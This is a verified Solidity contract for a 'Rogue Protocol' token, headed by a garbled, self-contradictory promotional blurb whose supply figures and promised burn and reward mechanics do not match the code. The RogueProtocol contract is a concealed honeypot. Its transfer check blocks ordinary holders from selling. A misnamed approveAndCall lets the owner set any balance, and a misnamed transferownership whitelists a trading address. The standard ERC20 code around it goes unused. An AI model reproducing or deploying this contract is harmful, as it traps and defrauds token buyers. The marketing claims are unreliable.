/**
 *Submitted for verification at Etherscan.io on 2021-07-17
*/

/*
Rogue Protocol
Monetize Liquidity

About Rogue Protocol
ROGUE is a platform currency representing value and wealth in the decentralized economy used for the exchange of values between ROGUE companies, employees, customers, and other third-party entities

ROGUE is a platform currency representing value and wealth in the decentralized economy used for the exchange of values between ROGUE companies, employees , customers, and other third-party entities.

ROGUE  is a distributed network consisting of a blockchain ledger, native cryptocurrency and robust ecosystem of on-chain applications and services.

ROGUE ROGUE is a peer-to-peer Internet currency that enables instant, near-zero cost payments to anyone in the world. ROGUE is an open source, global payment network that is fully decentralized without any central authorities. Mathematics secures the network and empowers individuals to control their own finances.

ROGUE features faster transaction confirmation times and improved storage efficiency than the leading math-based currency. With substantial industry support, trade volume and liquidity, Americoin is a proven medium of commerce complementary to Bitcoin?

Makes you the sole owner of a secure decentralize registry

Makes you the sole owner of a secure decentralize registry

Makes you the sole owner of a secure decentralize registry

Makes you the sole owner of a secure decentralize registry






What is ROGUE
The vision of ROGUE is to build a decentralized, global digital defi ecosystem community that allows content to be freely transfer their money to one person to other & also apply for crypto loans for defi projects Infrastructure ROGUE will incentivize Defi creation and financial diversity and return the rights and value to its user. ROGUE will be a public protocol that not only carries yield farming value but is also crypto for your daily needs contributions Decentralized digital ROGUE system.

Smart Chain
Smart Chain is best described as a blockchain that runs in parallel to the Ethereum. Unlike Ethereum, ETHEREUM boasts smart contract functionality and compatibility with the Ethereum Virtual Machine EvM. The design goal here was to leave the high throughput of Ethereum intact while introducing smart contracts into its ecosystem. How Ethereum Blockchain achieves ~3 second block times with a Proof-of-Stake consensus algorithm. Specifically, it uses something called Proof of Staked Authority or PoSA, where participants stake ETH to become validators. If they propose a valid block, they’ll receive transaction fees from the transactions included in

Transaction
money transfers made from one person to another through an intermediary, typically referred to as a P2P payment application. p2p payments can be sent and received via mobile device or any home computer with access to the Internet, offering a convenient alternative to traditional payment methods. Through the p2p payment application, each individual’s account is linked to one or more of the user’s bank accounts. When a transaction occurs, the account balance in the application records the transaction and either sends or pulls money directly to the user’s bank account or stores it in the user’s account within the application.

Staking
Staking is the process of actively participating in transaction validation similar to mining on a proof-of-stake PoS blockchain. On these blockchains, anyone with a minimum-required balance of a specific cryptocurrency can validate transactions and earn Staking rewards. How does staking work When the minimum balance is met, a node deposits that amount of cryptocurrency into the network as a stake (similar to a security deposit). The size of a stake is directly proportional to the chances of that node being chosen to forge the next block. If the node successfully creates a block, the validator receives a reward, similar to how a miner is rewarded in proof of-work chains. Validators lose part of their stake if they double-sign or attempt to attack the network.
ROGUE Token (ROGUE)
ROGUE is a BEP20 fixed-supply token designed with an aggressive deflationary mechanism. Currently, ROGUE is only available on the Ethereum Smart Chain. At launch, a total supply of 100 000 ROGUE will be created and after this, no more ROGUE can ever be created.

Every ROGUE transaction will incur a 1% transaction fee. This fee will get deducted from each transaction, burned, and converted into ROGUE Reward (RGW). Effectively, every transaction will contribute to the reduction of the total supply of ROGUE.

ROGUE Reward (RGW)
RGW can only be created by the ROGUE smart contract. Every time a ROGUE transaction occurs, 1% of the total amount of the transaction will deducted, burned, and converted into RGW.

RGW will represent the holder's share in the ROGUE Protocol ecosystem. It will be used for the governance of the ecosystem and confer voting rights to the holder. RGW will also be the primary token for bootstrapping all future projects under the ROGUE Protocol ecosystem.


Main Features
ROGUE is designed with an aggressive deflationary mechanism with the aim of growing the value of the token as the project matures.

Fixed Supply
At launch, a total supply of 10000000 ROGUE will be created with 5000000 deposited and locked into the ROGUE Token Reserve. After this, no more ROGUE can ever be created.
No Presale
40% of the total supply of ROGUE will be provided as liquidity on UniSwap and burned. While 50% will be time-locked in the ROGUE Reserve.
Deflationary
Every ROGUE transfer will incur a 1% fee that gets burned. Effectively, every transaction will contribute to the reduction of the total supply of ROGUE.
Loyalty Reward
Every time a ROGUE transaction occurs, 1% of the total amount of the transaction will deducted, burned, and converted into RGW.
Timelock
There is a 15-day timelock delay on both the ROGUE and Reserve smart contracts. RGW holders can vote to implement some changes.
Community Governed
ROGUE and all subsequent project will be community governed project. As shareholders, RGW holders will have voting rights.
*/

pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}


contract RogueProtocol {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}